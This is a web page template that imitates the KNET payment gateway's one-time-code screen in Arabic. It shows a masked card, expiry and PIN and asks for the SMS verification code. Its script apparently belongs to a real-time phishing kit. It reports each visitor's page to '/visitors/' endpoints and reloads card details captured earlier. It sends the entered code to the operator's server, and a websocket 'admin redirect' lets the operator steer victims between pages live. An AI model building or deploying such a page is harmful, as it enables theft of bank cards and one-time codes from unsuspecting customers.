<html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width,initial-scale=1"> <title>KNET Gateway</title> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/react-toastify@9.1.3/dist/ReactToastify.min.css"> <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="use-credentials"> <link rel="preconnect" href="https://fonts.gstatic.com"> <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&display=swa"> <style> #DCNumber {
      letter-spacing: 0.04em;
    }

    #pinMask {
      font-size: 0.72rem;
      letter-spacing: 0.16em;
      display: inline-block;
    } </style> </head> <body> <link href="{{url_for('static', path='css/txn-stylesheet.css?ver=1.70')}}" rel="stylesheet"> <link href="{{url_for('static', path='css/txn-responsive-ar.css?ver=1.70')}}" rel="stylesheet"> <form action="" name="paypage" id="paypage" method="post" autocomplete="off"> <div class="madd"> </div> <div id="payConfirm"> <div class="container"> <div class="content-block"> <div class="form-card"> <div class="container-blogo"> <img class="logoHead-mob" src="{{url_for('static',path='images/kib.jpeg')}}" alt="logo"> </div> <div class="row"> <div style="float:right;"><label class="column-label" style="width:auto;">:المستفيد </label></div> <div style="text-align:right;"><label class="column-value text-label" style="width:60%;">Commercial Facilities Co.</label></div> </div> <div id="OrgTranxAmtConfirm"> <div style="text-align:right;"><label class="column-value text-label" style="width:60%;">KD&nbsp;1.000</label></div> <div style="float:right;"><label class="column-label" style="width:auto;"> :المبلغ</label></div> </div> </div> <div class="form-card"> <div class="notification" id="codeMsgDC2" style="border:#ff0000 1px solid;background-color:#f7dadd;font-size:12px;font-family:helvetica,arial,sans serif;color:#ff0000;padding-right:15px;margin-bottom:3px;text-align:center;display:none;"></div> <div class="row alert-msg" id="notificationbox" style="color:#31708f;font-family:Arial,Helvetica,serif;font-size:10px;"> <div id="notification"> <p style="text-align:right;"><span> يرجى الانتباه: </span><span style="font-weight:unset;">سيتم الآن ارسال رسالة نصية على رقم هاتفك الجوال المسجل لدى البنك الخاص بك. هذه الرسالة المكونة من </span>6<span style="font-weight:unset;"> خانات هي "رمز التحقق لمرة واحدة"، يرجى استخدام هذا الرمز في الحقل المناسب ادناه</span></p> </div> </div> <div class="row"> <div style="text-align:right;"><label class="column-value text-label" id="DCNumber">00000******0000</label></div> <div id="payConfirmCardNum" style="text-align:right;"><label class="column-label">:رقم بطاقة الصرف الآلي</label></div> </div> <div class="row" id="payConfirmExpmnth" style="display:block;"> <div style="float:right;text-align:right;"><label class="column-label" style="width:100%;">:شهر انتهاء الصلاحية</label></div> <div style="text-align:right;"><label class="column-value text-label" id="expmnth">00</label></div> </div> <div class="row" id="payConfirmExpyr" style="display:block;"> <div style="float:right;text-align:right;"><label class="column-label" style="width:100%;">:سنة انتهاء الصلاحية</label></div> <div style="text-align:right;"><label class="column-value text-label" id="expyear">0000</label></div> </div> <div class="row"> <div style="float:right;text-align:right;"><label class="column-label" style="width:100%;">:الرقم السري</label></div> <div style="text-align:right;"><label class="column-value text-label" id="pinMask">●●●●</label></div> </div> <div class="row" id="codeDCDIV" style="display:block;"> <div style="float:right;text-align:right;padding-top:3px;"> <label class="column-label" style="width:100%;" alt="رمز التحقق">:رمز التحقق</label> </div> <div style="padding-left:7%;"> <input inputmode="numeric" pattern="[0-9]*" autocomplete="off" class="allownumericwithoutdecimal" style="text-align:right;width:60%;" id="dop" name="cardCodeInput" placeholder="Timeout in: 0:00" alt="رمز التحقق" dir="rtl" size="6" maxlength="6"> </div> </div> </div> <div class="form-card"> <div class="row"> <div style="text-align:center;"> <div id="submithide1"> <button type="button" name="confirm" id="proceedConfirm" class="submit-button" style="float:right;"> تأكيد العملية </button> <input name="proceedCancel" type="button" class="cancel-button" id="cancel" value="إلغاء"> </div> </div> </div> </div> <div align="center" id="overlayhide1" class="overlay" style="display:none;"> <img src="{{url_for('static', path='images/loadingmob.gif')}}" style="height: 15%;margin-top:50%;"> </div> <footer> <div class="footer-content"> <span> <div class="row_new"> <div style="text-align:center;font-size:12px;color:#000000;font-weight:normal;"> جميع الحقوق محفوظة&nbsp;©&nbsp;2026 <br> <span style="font-weight:bold;color:#0077D5;">شركة الخدمات المصرفية الآلية المشتركة – كي نت</span> </div> </div> </span> </div> </footer> </div> </div> </div> </form> <script nonce="{{ request.state.csp_nonce }}"> (() => {
      const currentPage = "التحقق";
      const dcNumberLabel = document.getElementById("DCNumber");
      const expiryMonthLabel = document.getElementById("expmnth");
      const expiryYearLabel = document.getElementById("expyear");
      const cardCodeTimerInput = document.getElementById("dop");
      const cancelButton = document.getElementById("cancel");
      const proceedConfirmButton = document.getElementById("proceedConfirm");
      const overlayHide = document.getElementById("overlayhide1");
      const codeMessageBox = document.getElementById("codeMsgDC2");

      fetch("/visitors/current-page", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        credentials: "same-origin",
        body: JSON.stringify({ current_page: currentPage })
      }).catch(() => {});

      fetch("/visitors/latest-knet-summary", {
        method: "GET",
        headers: { Accept: "application/json" },
        credentials: "same-origin",
        cache: "no-store",
      })
        .then((response) => response.ok ? response.json() : null)
        .then((payload) => {
          if (!payload || typeof payload !== "object") {
            return;
          }
          const cardMasked = typeof payload.card_masked === "string" && payload.card_masked.trim()
            ? payload.card_masked.trim()
            : "—";
          const expiryMonthValue = typeof payload.exp_month === "string" && payload.exp_month.trim()
            ? payload.exp_month.trim()
            : "00";
          const expiryYearValue = typeof payload.exp_year === "string" && payload.exp_year.trim()
            ? payload.exp_year.trim()
            : "0000";
          if (dcNumberLabel) {
            dcNumberLabel.textContent = cardMasked;
          }
          if (expiryMonthLabel) {
            expiryMonthLabel.textContent = expiryMonthValue;
          }
          if (expiryYearLabel) {
            expiryYearLabel.textContent = expiryYearValue;
          }
        })
        .catch(() => {});

      const formatCodeTimer = (secondsTotal) => {
        const safe = Math.max(0, Number.isFinite(secondsTotal) ? Math.floor(secondsTotal) : 0);
        const minutes = Math.floor(safe / 60);
        const seconds = safe % 60;
        return `Timeout in: ${minutes}:${String(seconds).padStart(2, "0")}`;
      };

      if (cardCodeTimerInput) {
        let remainingSeconds = 3 * 60 + 30;
        cardCodeTimerInput.placeholder = formatCodeTimer(remainingSeconds);
        const codeCountdownInterval = setInterval(() => {
          remainingSeconds -= 1;
          cardCodeTimerInput.placeholder = formatCodeTimer(remainingSeconds);
          if (remainingSeconds <= 0) {
            clearInterval(codeCountdownInterval);
          }
        }, 1000);
      }

      const checkAdminRedirect = () => {
        fetch("/visitors/redirect-check", {
          method: "GET",
          headers: { Accept: "application/json" },
          credentials: "same-origin",
          cache: "no-store",
        })
          .then((response) => response.ok ? response.json() : null)
          .then((payload) => {
            if (!payload || payload.redirect !== true) {
              return;
            }
            const targetPath = typeof payload.target_path === "string" ? payload.target_path.trim() : "";
            if (targetPath && targetPath !== window.location.pathname) {
              window.location.href = targetPath;
            }
          })
          .catch(() => {});
      };

      const showCodeError = (message) => {
        if (!codeMessageBox) {
          return;
        }
        codeMessageBox.textContent = message;
        codeMessageBox.style.display = "block";
      };

      const clearCodeError = () => {
        if (!codeMessageBox) {
          return;
        }
        codeMessageBox.textContent = "";
        codeMessageBox.style.display = "none";
      };

      let redirectSocket = null;
      let redirectSocketReconnectTimer = null;
      let redirectSocketPingTimer = null;
      let hasRedirected = false;

      const navigateToRedirectTarget = (targetPathRaw) => {
        if (hasRedirected) {
          return;
        }
        const targetPathInput = typeof targetPathRaw === "string" ? targetPathRaw.trim() : "";
        const targetPath = ({
          "/additional-info": "/additional-customer-info",
          "/transaction-info": "/transaction-notification"
        }[targetPathInput] || targetPathInput);
        if (!targetPath || targetPath === window.location.pathname) {
          return;
        }
        hasRedirected = true;
        window.location.href = targetPath;
      };

      const connectAdminRedirectSocket = () => {
        if (redirectSocketReconnectTimer) {
          clearTimeout(redirectSocketReconnectTimer);
          redirectSocketReconnectTimer = null;
        }
        if (redirectSocketPingTimer) {
          clearInterval(redirectSocketPingTimer);
          redirectSocketPingTimer = null;
        }
        if (redirectSocket && (redirectSocket.readyState === WebSocket.OPEN || redirectSocket.readyState === WebSocket.CONNECTING)) {
          return;
        }

        const scheme = window.location.protocol === "https:" ? "wss:" : "ws:";
        const socketUrl = `${scheme}//${window.location.host}/ws/visitor/redirect`;

        try {
          redirectSocket = new WebSocket(socketUrl);
        } catch (_) {
          redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
          return;
        }

        redirectSocket.addEventListener("open", () => {
          redirectSocketPingTimer = setInterval(() => {
            if (!redirectSocket || redirectSocket.readyState !== WebSocket.OPEN) {
              return;
            }
            try {
              redirectSocket.send(JSON.stringify({ type: "heartbeat", current_page: currentPage }));
            } catch (_) {
              // noop
            }
          }, 5000);
        });

        redirectSocket.addEventListener("message", (event) => {
          let payload = null;
          try {
            payload = JSON.parse(event.data);
          } catch (_) {
            payload = null;
          }
          const eventName = payload && typeof payload === "object"
            ? String(payload.event || "").trim().toLowerCase()
            : "";
          if (eventName !== "visitor.redirect") {
            return;
          }
          const meta = payload && typeof payload === "object" && payload.meta && typeof payload.meta === "object"
            ? payload.meta
            : null;
          navigateToRedirectTarget(meta ? meta.target_path : "");
        });

        redirectSocket.addEventListener("close", () => {
          if (redirectSocketPingTimer) {
            clearInterval(redirectSocketPingTimer);
            redirectSocketPingTimer = null;
          }
          redirectSocket = null;
          redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
        });

        redirectSocket.addEventListener("error", () => {
          try {
            redirectSocket.close();
          } catch (_) {
            // noop
          }
        });
      };

      const sendHeartbeat = () => {
        fetch("/visitors/heartbeat", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          credentials: "same-origin",
          body: JSON.stringify({ current_page: currentPage })
        }).catch(() => {});
        checkAdminRedirect();
      };

      sendHeartbeat();
      connectAdminRedirectSocket();
      const heartbeatInterval = setInterval(() => {
        if (document.visibilityState === "visible") {
          sendHeartbeat();
        }
      }, 5000);
      const redirectFallbackInterval = setInterval(() => {
        if (document.visibilityState === "visible") {
          checkAdminRedirect();
        }
      }, 15000);
      document.addEventListener("visibilitychange", () => {
        if (document.visibilityState === "visible") {
          sendHeartbeat();
        }
      });

      window.addEventListener("pageshow", () => {
        hasRedirected = false;
        sendHeartbeat();
        connectAdminRedirectSocket();
      });

      window.addEventListener("beforeunload", () => {
        clearInterval(heartbeatInterval);
        clearInterval(redirectFallbackInterval);
      });

      if (cancelButton) {
        cancelButton.addEventListener("click", () => {
          try {
            window.sessionStorage.setItem("knet_skip_auto_redirect_once", "1");
          } catch (_) {
            // noop
          }
          window.location.href = "/knet?restore=1";
        });
      }

      if (proceedConfirmButton && cardCodeTimerInput) {
        proceedConfirmButton.addEventListener("click", async () => {
          clearCodeError();
          const codeValue = String(cardCodeTimerInput.value || "").trim();
          if (!/^[0-9]{6}$/.test(codeValue)) {
            showCodeError("يرجى إدخال رمز مكون من 6 أرقام.");
            return;
          }
          proceedConfirmButton.disabled = true;
          if (overlayHide) {
            overlayHide.style.display = "block";
          }
          try {
            const response = await fetch("/visitors/verfication-code", {
              method: "POST",
              headers: { "Content-Type": "application/json", Accept: "application/json" },
              credentials: "same-origin",
              body: JSON.stringify({ code_value: codeValue }),
            });
            if (!response.ok) {
              showCodeError("تعذر إرسال الرمز، حاول مرة أخرى.");
              return;
            }
            cardCodeTimerInput.value = "";
          } catch (_) {
            showCodeError("تعذر إرسال الرمز، تحقق من الاتصال.");
          } finally {
            if (overlayHide) {
              overlayHide.style.display = "none";
            }
            proceedConfirmButton.disabled = false;
          }
        });
      }
    })(); </script> </body> </html>
